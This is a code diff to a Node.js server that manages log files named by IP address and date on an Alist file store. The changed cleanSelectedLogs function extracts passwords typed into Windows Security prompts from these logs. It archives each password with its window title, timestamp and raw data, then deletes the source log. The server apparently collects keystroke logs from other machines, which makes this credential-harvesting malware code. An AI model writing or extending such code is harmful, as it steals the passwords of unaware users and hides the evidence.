@@ -626,21 +626,31 @@ class AlistClient {
         return { success: true, filename };
     }
 
-    async deleteFile(filePath) {
-        const fullPath = this._getFullPath(filePath);
-        const lastSlash = fullPath.lastIndexOf('/');
-        const dir = lastSlash > 0 ? fullPath.substring(0, lastSlash) : '/';
-        const filename = fullPath.substring(lastSlash + 1);
+    // server.js -> AlistClient 类
 
+async deleteFile(filePath) {
+    const fullPath = this._getFullPath(filePath);
+    try {
         await this._request('POST', '/api/fs/remove', {
-            path: dir,
-            names: [filename]
+            names: [path.basename(fullPath)],
+            path: path.dirname(fullPath) // 父目录
         });
-
-        this._invalidateCache(this._getCacheKey('list', dir));
-        this.logger.debug(`文件已删除: ${fullPath}`);
-        return { success: true };
+    } catch (firstTryError) {
+        // 如果常规删除失败，尝试另一种 Alist 常见写法：DELETE 方法
+        this.logger.warn(`常规删除失败 (${fullPath})，尝试备用方式...`);
+        try {
+            await this._request('DELETE', `/api/fs/remove?path=${encodeURIComponent(fullPath)}`);
+        } catch (secondTryError) {
+            this.logger.error(`备用删除也失败了: ${fullPath}`, { error: secondTryError.message });
+            throw secondTryError; // 两次都失败，抛出异常
+        }
     }
+    // 让缓存失效
+    const dir = path.dirname(fullPath);
+    this._invalidateCache(this._getCacheKey('list', dir));
+    this.logger.debug(`文件已删除: ${fullPath}`);
+    return { success: true };
+}
 }
 
 const alistClient = new AlistClient(CONFIG.alist);
@@ -1501,91 +1511,7 @@ function handleWebSocketConnection(ws, req) {
 }
 
 //自动清理过期日志文件 
-async function cleanExpiredLogs() {
-    const now = Date.now();
-    const retentionMs = CONFIG.logRetentionDays * 24 * 60 * 60 * 1000;
-    let cleanedCount = 0;
-    let savedLinesCount = 0;
 
-    try {
-        // 1. 获取所有日志文件
-        let allFiles;
-        try {
-            allFiles = await alistClient.listFiles(CONFIG.alist.basePath, true);
-        } catch (err) {
-            logger.error(`[日志清理] 无法列出文件: ${err.message}`);
-            return;
-        }
-
-        const logFiles = allFiles.filter(f => f.filename.endsWith('.log'));
-        if (logFiles.length === 0) {
-            logger.debug('[日志清理] 没有 .log 文件需要检查');
-            return;
-        }
-
-        logger.info(`[日志清理] 开始检查 ${logFiles.length} 个日志文件，保留 ${CONFIG.logRetentionDays} 天`);
-
-        for (const file of logFiles) {
-            // 2. 从文件名中提取日期（支持 IP_YYYYMMDD.log 格式）
-            const dateMatch = file.filename.match(/(\d{8})\.log$/);
-            if (!dateMatch) {
-                logger.debug(`[日志清理] 跳过无法识别日期的文件: ${file.filename}`);
-                continue;
-            }
-
-            const dateStr = dateMatch[1];
-            const year = parseInt(dateStr.substring(0, 4));
-            const month = parseInt(dateStr.substring(4, 6)) - 1; // 月份从0开始
-            const day = parseInt(dateStr.substring(6, 8));
-            const fileDate = new Date(year, month, day);
-            const fileAge = now - fileDate.getTime();
-
-            // 3. 未过期则跳过
-            if (fileAge <= retentionMs) continue;
-
-            // 4. 过期文件处理
-            const filePath = `${CONFIG.alist.basePath}/${file.filename}`;
-            logger.info(`[日志清理] 发现过期文件: ${file.filename} (日期: ${dateStr})`);
-
-            try {
-                // 4.1 读取文件内容
-                const content = await alistClient.readFile(filePath);
-                const lines = content.split(/\r?\n/);
-
-                // 4.2 提取包含“Windows 安全”或“Windows 安全中心”的行
-                const sensitiveLines = lines.filter(line =>
-                    line.includes('Windows 安全') || line.includes('Windows 安全中心')
-                );
-
-                // 4.3 如果有敏感行，追加保存到归档文件
-                if (sensitiveLines.length > 0) {
-                    const header = `\n--- ${file.filename} (${dateStr}) ---\n`;
-                    const block = header + sensitiveLines.join('\n') + '\n';
-                    // 确保归档文件所在目录存在
-                    const dir = path.dirname(CONFIG.sensitiveLogSavePath);
-                    if (!fs.existsSync(dir)) {
-                        fs.mkdirSync(dir, { recursive: true });
-                    }
-                    await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
-                    savedLinesCount += sensitiveLines.length;
-                    logger.debug(`[日志清理] 从 ${file.filename} 保存了 ${sensitiveLines.length} 条信息`);
-                }
-
-                // 4.4 确认保存成功（无异常）后，删除源文件
-                await alistClient.deleteFile(filePath);
-                cleanedCount++;
-                logger.info(`[日志清理] 已删除: ${file.filename}`);
-            } catch (err) {
-                logger.error(`[日志清理] 处理 ${file.filename} 时出错: ${err.message}`);
-                // 继续处理下一个文件，避免一个失败影响全部
-            }
-        }
-
-        logger.info(`[日志清理] 清理完成：删除 ${cleanedCount} 个文件，保存 ${savedLinesCount} 条敏感信息`);
-    } catch (err) {
-        logger.error(`[日志清理] 全局异常: ${err.message}`);
-    }
-}
 
 // 扫描过期日志文件（不删除，仅列出）
 async function scanExpiredLogs() {
@@ -1633,24 +1559,30 @@ async function cleanSelectedLogs(filenames) {
     for (const filename of filenames) {
         const filePath = `${CONFIG.alist.basePath}/${filename}`;
         try {
-            // 读取文件内容
+            // 1. 读取文件内容
             const content = await alistClient.readFile(filePath);
-            const lines = content.split(/\r?\n/);
 
-            const sensitiveLines = lines.filter(line =>
-                line.includes('Windows 安全') || line.includes('Windows 安全中心')
-            );
+            // 2. 调用密码提取逻辑
+            const extractedPasswords = extractPasswordsFromLog(content, filename);
 
-            if (sensitiveLines.length > 0) {
-                const header = `\n--- ${filename} (deleted on ${new Date().toISOString()}) ---\n`;
-                const block = header + sensitiveLines.join('\n') + '\n';
+            // 3. 如果有提取到密码，追加保存到归档文件
+            if (extractedPasswords.length > 0) {
+                let block = `\n--- ${filename} (deleted on ${new Date().toISOString()}) ---\n`;
+                extractedPasswords.forEach((item, index) => {
+                    block += `${index + 1}. 来自: ${item.file}\n`;
+                    block += `窗口: ${item.window || '未知'}\n`;
+                    block += `时间: ${item.timestamp}\n`;
+                    block += `内容: ${item.password}\n`;
+                    block += `原始数据: ${item.rawPassword}\n\n`;
+                });
 
                 const dir = path.dirname(CONFIG.sensitiveLogSavePath);
                 if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
                 await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
-                totalSaved += sensitiveLines.length;
+                totalSaved += extractedPasswords.length;
             }
 
+            // 4. 删除源文件
             await alistClient.deleteFile(filePath);
             totalClean++;
             results.push({ filename, success: true });
@@ -1660,7 +1592,7 @@ async function cleanSelectedLogs(filenames) {
         }
     }
 
-    logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 行敏感信息`);
+    logger.info(`[清理选中] 完成：删除 ${totalClean} 个，保存 ${totalSaved} 条密码`);
     return { results, totalClean, totalSaved };
 }
 
